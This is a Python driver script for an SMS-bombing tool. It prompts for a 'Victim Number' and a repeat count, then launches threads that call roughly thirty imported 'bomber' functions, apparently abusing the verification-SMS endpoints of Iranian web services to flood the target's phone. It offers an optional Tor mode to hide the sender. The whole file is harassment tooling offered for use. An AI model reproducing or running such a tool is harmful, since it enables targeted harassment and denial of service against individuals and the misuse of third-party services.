from time import sleep
from menu import menu
from modulewtor import bombers #without tor
from moduletor import bomberstor #with tor
from threading import Thread
from colorama import Fore as color
import sys,os

def main():
    menu.banner()
    menu.menu_res()
    print('\n')
    user_input_loop = 0
    choice = int(input(color.WHITE+'Enter Your Choice: '))
    
    if (choice == 1): #without tor   
        try:
            os.system('clear')
            menu.banner()
            number = input(color.GREEN+'[+] Enter Victim Number(without 0) -> ')
            user_input_loop2 = input(color.WHITE+"[+] How many times you want to send messages? (default == 1 sms) (1 times = 30sms) -> ")
            
            if user_input_loop2 == '' or user_input_loop2.isdigit() == False:
                user_input_loop = 0
            elif user_input_loop2.isdigit():
                user_input_loop = int(user_input_loop2)

            if user_input_loop == 0:
                    Thread(target=bombers.sahmeto_bomber(number)).start()

        except:
            print('error!')
        
        for i in range(user_input_loop):
            Thread(target=bombers.digikala_bomber(number)).start()
            Thread(target=bombers.divar_bomber(number)).start()
            Thread(target=bombers.sheypoor_bomber(number)).start()
            Thread(target=bombers.snap_bomber(number)).start()
            Thread(target=bombers.tapsi_bomber(number)).start()
            Thread(target=bombers.torob_bomber(number)).start()
            Thread(target=bombers.bama_bomber(number)).start()
            Thread(target=bombers.emtiaz_bomber(number)).start()
            Thread(target=bombers.gap_bomber(number)).start()
            Thread(target=bombers.lenz_bomber(number)).start()
            Thread(target=bombers.barghman_bomber(number)).start()
            Thread(target=bombers.pinorest_bomber(number)).start()
            Thread(target=bombers.hamrahmechanic_bomber(number)).start()
            Thread(target=bombers.jabama_bomber(number)).start()
            Thread(target=bombers.mobit_bomber(number)).start()
            Thread(target=bombers.drdr_bomber(number)).start()
            Thread(target=bombers.gabzino_bomber(number)).start()
            Thread(target=bombers.pinket_bomber(number)).start() 
            Thread(target=bombers.digijet_bomber(number)).start()
            Thread(target=bombers.cafebazaar_bomber(number)).start()
            Thread(target=bombers.lidoma_bomber(number)).start()
            Thread(target=bombers.vandar_bomber(number)).start()
            Thread(target=bombers.taaghche_bomber(number)).start()
            Thread(target=bombers.flightio_bomber(number)).start()
            Thread(target=bombers.karnameh_bomber(number)).start()
            Thread(target=bombers.bit24_bomber(number)).start()
            Thread(target=bombers.sahmeto_bomber(number)).start()
            Thread(target=bombers.sahmio_bomber(number)).start()
            Thread(target=bombers.ponisha_bomber(number)).start()
            Thread(target=bombers.pindo_bomber(number)).start()

    elif (choice == 2): #with tor
        try:
            os.system('clear')
            menu.banner()
            number = input(color.GREEN+'[+] Enter Victim Number(without 0) -> ')
            user_input_loop2 = input(color.WHITE+"[+] How many times you want to send messages? (defult == 1 sms) (1 times = 30sms) -> ")
            
            if user_input_loop2 == '' or user_input_loop2.isdigit() == False:
                user_input_loop = 0
            elif user_input_loop2.isdigit():
                user_input_loop = int(user_input_loop2)

            if user_input_loop == 0:
                Thread(target=bomberstor.divar_bomber(number)).start()
        except:
            print('error!')

        for i in range(user_input_loop):
            Thread(target=bomberstor.digikala_bomber(number)).start()
            Thread(target=bomberstor.divar_bomber(number)).start() 
            Thread(target=bomberstor.sheypoor_bomber(number)).start()
            Thread(target=bomberstor.snap_bomber(number)).start()
            Thread(target=bomberstor.tapsi_bomber(number)).start()
            Thread(target=bomberstor.torob_bomber(number)).start()
            Thread(target=bomberstor.bama_bomber(number)).start()
            Thread(target=bomberstor.emtiaz_bomber(number)).start()
            Thread(target=bomberstor.gap_bomber(number)).start()
            Thread(target=bomberstor.lenz_bomber(number)).start()
            Thread(target=bomberstor.barghman_bomber(number)).start()
            Thread(target=bomberstor.pinorest_bomber(number)).start()
            Thread(target=bomberstor.hamrahmechanic_bomber(number)).start()
            Thread(target=bomberstor.jabama_bomber(number)).start()
            Thread(target=bomberstor.mobit_bomber(number)).start()
            Thread(target=bomberstor.drdr_bomber(number)).start()
            Thread(target=bomberstor.gabzino_bomber(number)).start()
            Thread(target=bomberstor.pinket_bomber(number)).start() 
            Thread(target=bomberstor.digijet_bomber(number)).start()
            Thread(target=bomberstor.cafebazaar_bomber(number)).start()
            Thread(target=bomberstor.lidoma_bomber(number)).start()
            Thread(target=bomberstor.vandar_bomber(number)).start()
            Thread(target=bomberstor.taaghche_bomber(number)).start()
            Thread(target=bomberstor.flightio_bomber(number)).start()
            Thread(target=bomberstor.karnameh_bomber(number)).start()
            Thread(target=bomberstor.bit24_bomber(number)).start()
            Thread(target=bomberstor.sahmeto_bomber(number)).start()
            Thread(target=bomberstor.sahmio_bomber(number)).start()
            Thread(target=bomberstor.ponisha_bomber(number)).start()
            Thread(target=bombers.pindo_bomber(number)).start()

    elif (choice == 0):
        os.system('clear')
        sys.exit()
    else:
        print('Error!')
        sys.exit()
    
    repeat = 'n'
    repeat = input(color.LIGHTYELLOW_EX+'Do you want to continue? (y/n)(default == n) -> ').lower()
    
    if repeat == 'y':
        os.system('clear')
        main()
    elif repeat == 'n':
        print(color.WHITE+'Good Luck!')
        sleep(2)
        os.system('clear')
        sys.exit()
    else:
        print(color.RED+'Unspecified entry!')
        os.system('clear')
        sys.exit()
    
if __name__ == '__main__':
    main()